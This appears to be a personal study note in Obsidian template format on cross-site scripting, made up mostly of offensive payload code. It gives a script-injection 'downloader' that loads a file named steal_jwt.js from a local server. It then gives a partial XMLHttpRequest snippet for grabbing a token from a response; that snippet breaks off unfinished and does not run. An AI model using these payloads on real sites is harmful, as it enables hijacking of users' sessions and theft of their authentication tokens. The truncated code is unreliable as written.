---
creation date: April 17th 2023
last modified date: April 17th 2023
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[XSS]]  
___

## Description:  

### Downloader for longer XSS payloads
```
var a=document.createElement(“script”);a.src=http://localhost:8000/steal_jwt.js;document.body.appendChild(a);
```

### stealing value set in a response

Use the downloader to pull the following code:

```
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == 4 && xhr.status == 200) {
var yourtoken = xhr.response


```
___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: April 17th 2023 (12:11 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
